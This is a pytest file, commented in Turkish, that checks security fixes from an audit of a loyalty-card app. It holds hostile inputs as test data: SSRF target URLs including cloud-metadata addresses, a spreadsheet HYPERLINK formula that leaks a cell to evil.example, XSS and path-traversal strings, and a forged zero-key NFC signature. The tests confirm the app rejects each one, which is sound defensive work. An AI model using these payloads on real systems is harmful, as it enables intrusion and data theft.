"""
Güvenlik sertleştirme (2026-11-08 denetimi, ADR-32) — her düzeltmenin kalıcı testi:
push adresi SSRF, Excel formül enjeksiyonu, parola değişince oturumların düşmesi, kaynak kodda parola olmaması ve eski
varsayılan parolanın tespiti, istek gövdesi sınırı, NFC fabrika anahtarı, güvenlik günlüğü şişirme, cihaz belirteci,
renk / görsel yolu doğrulaması, ödül teslim uçlarında hız sınırı.
"""
import io
import logging

import pytest
from openpyxl import load_workbook
from starlette.testclient import TestClient

from app import auth
from app.db import get_db, init_db, set_setting
from app.main import app
from app.services import nfc_sun
from app.services.push import is_safe_push_endpoint, send_webpush_to_subscription
from app.services.staff import hash_password, verify_password
from app.services.uploads import UploadError, normalize_image_ref
from app.utils import check_rate_limit

CONSENT = {"kvkk_read": True, "explicit_consent": True}
MANAGER = {"username": "mudur", "password": "Test-Mudur-2026"}
STAFF = {"username": "kasa1", "password": "Test-Kasa-2026"}
SUB_KEYS = {"p256dh": "BNcRdreALRFXTkOOUHK1EtK2wtaz5Ry4YfYCA_0QTpQ", "auth": "tBHItJI5svbpez7KI4CCXg"}
VAPID = {
    "VAPID_PUBLIC_KEY": "BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuBkr3qBUYIHBQFLXYp5Nksh8U",
    "VAPID_PRIVATE_KEY": "UUxI4O8-FbRouAevSmBQ6o18hgE4nSG3qwvJTfKc-ls",
    "VAPID_SUBJECT": "mailto:test@example.com",
}


def _client():
    return TestClient(app, base_url="https://testserver")


def _login(creds):
    c = _client()
    r = c.post("/panel/login", json=creds).json()
    assert r["status"] == "success", r
    return c


def _customer(phone):
    c = _client()
    r = c.post("/api/auth/login", json={"phone": phone, **CONSENT}).json()
    assert r["status"] == "success", r
    return c, r["device_token"]


def _count(sql, *args):
    with get_db() as conn:
        return conn.execute(sql, args).fetchone()[0]


# ------------------------------------------------------------------ 1. SSRF: push abonelik adresi
UNSAFE_ENDPOINTS = [
    "http://fcm.googleapis.com/fcm/send/x",              # şifresiz
    "https://127.0.0.1/x", "https://127.1/x", "https://0x7f.1/x", "https://[::1]/x",
    "https://169.254.169.254/latest/meta-data/",          # bulut meta veri servisi
    "https://db/x", "https://directus:8055/utils/cache/clear", "https://localhost/x",
    "https://metadata.google.internal/x", "https://push.example:8443/x", "https://user:pw@push.example/x",
    "ftp://push.example/x",
]


def test_push_subscription_rejects_internal_and_ip_endpoints(client):
    assert is_safe_push_endpoint("https://fcm.googleapis.com/fcm/send/abc")
    assert is_safe_push_endpoint("https://web.push.apple.com/QH4")
    assert is_safe_push_endpoint("https://wns2-par02p.notify.windows.com/w/?token=x")
    for ep in UNSAFE_ENDPOINTS:
        assert not is_safe_push_endpoint(ep), ep
        assert client.post("/api/push/subscribe", json={"endpoint": ep, **SUB_KEYS}).json()["status"] == "error", ep
    assert _count("SELECT COUNT(*) FROM push_subscriptions") == 0
    ok = client.post("/api/push/subscribe", json={"endpoint": "https://fcm.googleapis.com/fcm/send/abc", **SUB_KEYS}).json()
    assert ok["status"] == "success"


def test_stored_unsafe_endpoint_is_never_contacted(client, monkeypatch):
    """Eski sürümde kaydedilmiş iç ağ adresine sunucu istek atmaz; abonelik kapatılır."""
    import app.services.push as push_service
    for k, v in VAPID.items():
        monkeypatch.setenv(k, v)
    calls = []
    monkeypatch.setattr(push_service, "webpush", lambda *a, **kw: calls.append(kw))
    with get_db(immediate=True) as conn:
        cur = conn.execute(
            "INSERT INTO push_subscriptions (customer_id, endpoint, p256dh, auth, token_hash, created_at, last_success_at, "
            "fail_count, active) VALUES (NULL, ?, ?, ?, NULL, '2026-11-08T10:00:00+03:00', NULL, 0, 1)",
            ("http://directus:8055/items", SUB_KEYS["p256dh"], SUB_KEYS["auth"]),
        )
        sub = conn.execute("SELECT * FROM push_subscriptions WHERE id = ?", (cur.lastrowid,)).fetchone()
        errors: list[str] = []
        assert send_webpush_to_subscription(conn, sub, {"title": "t", "body": "b"}, errors=errors) is False
        assert conn.execute("SELECT active FROM push_subscriptions WHERE id = ?", (sub["id"],)).fetchone()[0] == 0
    assert calls == [] and errors


# ------------------------------------------------------------------ 2. Excel formül enjeksiyonu
def test_monthly_excel_writes_customer_text_as_plain_text_not_formula(client):
    evil = '=HYPERLINK("https://evil.example/?x="&A1,"Tikla")'
    c, tok = _customer("0532 900 00 02")
    assert c.post("/api/profile/update", json={"display_name": evil}, headers={"X-Device-Token": tok}).json()["status"] == "success"
    res = _login(MANAGER).get("/api/admin/reports/monthly-export?format=xlsx")
    assert res.status_code == 200
    wb = load_workbook(io.BytesIO(res.content))
    cells = [cell for ws in wb.worksheets for row in ws.iter_rows() for cell in row if cell.value is not None]
    assert [cl.coordinate for cl in cells if cl.data_type == "f"] == []          # dosyada hiç formül yok
    assert any(cl.value == evil and cl.data_type == "s" for cl in cells)         # ad, düz metin olarak duruyor


# ------------------------------------------------------------------ 3. Oturumlar: parola değişince düşer
def test_password_change_and_reset_log_out_existing_sessions(client):
    a, b = _login(MANAGER), _login(MANAGER)
    changed = a.post("/api/admin/account", json={"current_password": MANAGER["password"], "new_password": "Baska-Sifre-2026"})
    assert changed.json()["status"] == "success"
    assert a.get("/api/admin/overview").status_code == 200     # değiştiren cihazın çerezi yenilendi
    assert b.get("/api/admin/overview").status_code == 401     # eski (çalınmış olabilecek) oturum düştü

    staff = _login(STAFF)
    assert staff.get("/api/staff/session").status_code == 200
    with get_db() as conn:
        sid = conn.execute("SELECT id FROM admin_users WHERE username = 'kasa1'").fetchone()[0]
    assert a.post(f"/api/admin/staff/{sid}/update", json={"password": "Yeni-Kasa-2026"}).json()["status"] == "success"
    assert staff.get("/api/staff/session").status_code == 401  # müdür parolayı sıfırlayınca kasiyerin oturumu düşer
    assert _login({"username": "kasa1", "password": "Yeni-Kasa-2026"}).get("/api/staff/session").status_code == 200


def test_session_without_password_fingerprint_and_non_ascii_cookie_are_rejected(client):
    with get_db() as conn:
        uid = conn.execute("SELECT id FROM admin_users WHERE username = 'mudur'").fetchone()[0]
    old = _client()
    old.cookies.set("mgr_session", auth.create_session("manager", "Müdür", uid))   # bu sürümden önceki biçim (izsiz)
    assert old.get("/api/admin/overview").status_code == 401
    weird = client.get("/api/admin/overview", headers=[(b"cookie", "mgr_session=é.ü".encode("utf-8"))])
    assert weird.status_code == 401                                                # 500 değil


# ------------------------------------------------------------------ 4. Kaynak kodda parola yok / eski varsayılan
def test_legacy_default_password_is_flagged_and_cannot_be_chosen_again(client):
    with get_db(immediate=True) as conn:
        conn.execute("UPDATE admin_users SET password_hash = ? WHERE username = 'kasa1'", (hash_password("Kasa2026!"),))
    weak = _client().post("/panel/login", json={"username": "kasa1", "password": "Kasa2026!"}).json()
    assert weak["status"] == "success" and weak["weak_password"] is True
    assert _count("SELECT COUNT(*) FROM security_incidents WHERE incident_type = 'default_password_in_use'") == 1
    normal = _client().post("/panel/login", json=MANAGER).json()
    assert normal["status"] == "success" and "weak_password" not in normal

    mgr = _login(MANAGER)
    bad = mgr.post("/api/admin/staff/create", json={"name": "Deniz", "username": "deniz", "password": "Blvd2026!"}).json()
    assert bad["status"] == "error" and "eski varsayılan" in bad["message"]
    own = mgr.post("/api/admin/account", json={"current_password": MANAGER["password"], "new_password": "Kasa2026!"}).json()
    assert own["status"] == "error"


def test_fresh_install_uses_random_manager_password_and_no_default_cashier(tmp_path, monkeypatch, caplog):
    monkeypatch.delenv("MANAGER_PASSWORD", raising=False)
    monkeypatch.delenv("STAFF_PASSWORD", raising=False)
    fresh = tmp_path / "fresh.db"
    with caplog.at_level(logging.WARNING, logger="sadakat"):
        init_db(db_path=fresh)
    with get_db(db_path=fresh) as conn:
        rows = conn.execute("SELECT username, role, password_hash FROM admin_users").fetchall()
    assert [(r["username"], r["role"]) for r in rows] == [("mudur", "manager")]    # kasiyer tohumlanmadı
    pw_hash = rows[0]["password_hash"]
    assert not verify_password("Blvd2026!", pw_hash)
    msg = next(r.getMessage() for r in caplog.records if "geçici parola" in r.getMessage())
    generated = msg.split("geçici parola: ", 1)[1].split(" ", 1)[0]
    assert len(generated) >= 12 and verify_password(generated, pw_hash)


# ------------------------------------------------------------------ 5. İstek gövdesi sınırı
def test_oversized_request_body_is_rejected_with_413(client):
    r = client.post("/api/claim", content=b"{" + b" " * (1024 * 1024) + b"}", headers={"Content-Type": "application/json"})
    assert r.status_code == 413
    assert r.headers["x-content-type-options"] == "nosniff"       # 413 de güvenlik başlıklarıyla döner


# ------------------------------------------------------------------ 6. NFC fabrika anahtarı
def test_nfc_with_factory_zero_keys_never_stamps(client):
    zero = bytes(16)
    with get_db(immediate=True) as conn:
        set_setting(conn, nfc_sun.META_KEY_SETTING, zero.hex().upper())
        set_setting(conn, nfc_sun.FILE_KEY_SETTING, zero.hex().upper())
        set_setting(conn, "daily_limit", "5")
    c, _ = _customer("0532 900 00 03")
    forged = nfc_sun.build_query(zero, zero, bytes.fromhex("04DE5F1EACC040"), 7)   # herkesin üretebileceği "geçerli" imza
    assert c.post("/api/claim", json={"claim_token": "/n?" + forged}).json()["status"] == "nfc_unavailable"
    # yalnızca kayıt hediyesi (ADR-35, giriş); sahte NFC dokunuşu damga vermedi
    assert _count("SELECT COUNT(*) FROM stamps WHERE voided_at IS NULL AND COALESCE(source, '') != 'welcome'") == 0
    assert _count("SELECT COUNT(*) FROM nfc_tags") == 0
    assert _login(MANAGER).get("/api/admin/stamp-security").json()["nfc"]["last_event"]["result"] == "zero_key"


# ------------------------------------------------------------------ 7. Güvenlik günlüğü şişirme
def test_rate_limit_overflow_is_logged_once_per_window(client):
    results = [check_rate_limit("birim_testi_203.0.113.9", max_requests=2, window_seconds=60) for _ in range(12)]
    assert results[:2] == [True, True] and not any(results[2:])
    assert _count("SELECT COUNT(*) FROM audit_logs WHERE event_type = 'rate_limit_exceeded'") == 1


def test_anonymous_admin_flood_is_logged_at_most_30_times(client):
    assert {client.get("/api/admin/overview").status_code for _ in range(40)} == {401}
    assert _count("SELECT COUNT(*) FROM audit_logs WHERE event_type = 'unauthorized_access'") == 30


# ------------------------------------------------------------------ 8. Cihaz belirteci
def test_device_token_in_url_is_ignored_and_weak_client_token_is_not_adopted(client):
    _, tok = _customer("0532 900 00 04")
    assert _client().get(f"/api/my-card?device_token={tok}").json()["status"] == "device_not_found"
    assert _client().get("/api/my-card", headers={"X-Device-Token": tok}).json()["status"] == "success"
    weak = _client().post("/api/auth/login", json={"phone": "0532 900 00 05", "device_token": "1", **CONSENT}).json()
    assert weak["status"] == "success" and weak["device_token"] != "1" and len(weak["device_token"]) >= 32


# ------------------------------------------------------------------ 9. Ayar / görsel yolu doğrulaması, ödül teslim sınırı
def test_accent_color_only_accepts_hex(client):
    mgr = _login(MANAGER)
    mgr.post("/api/admin/settings", json={"accent_color": "#123ABC"})
    mgr.post("/api/admin/settings", json={"accent_color": "red;}</style><script>alert(1)</script>"})
    with get_db() as conn:
        assert conn.execute("SELECT value FROM settings WHERE key = 'accent_color'").fetchone()[0] == "#123ABC"


def test_image_reference_must_be_a_plain_upload_file_name():
    name = "static/uploads/" + "a" * 32 + ".jpg"
    assert normalize_image_ref("/k/" + name) == name
    assert normalize_image_ref("static/uploads/seed-cup-lotus.jpg") == "static/uploads/seed-cup-lotus.jpg"
    for bad in ('static/uploads/x" onerror="alert(1).jpg', "static/uploads/sub/x.jpg", "static/uploads/../app.py",
                "static/uploads/<svg>.png", "https://evil.example/x.jpg", "static/uploads/ x.jpg"):
        with pytest.raises(UploadError):
            normalize_image_ref(bad)


def test_redeem_endpoints_are_rate_limited(client):
    messages = [client.post("/api/redeem-check", json={"staff_token": f"tahmin-{i}"}).json()["message"] for i in range(21)]
    assert "Çok fazla istek" not in messages[0] and "Çok fazla istek" in messages[-1]
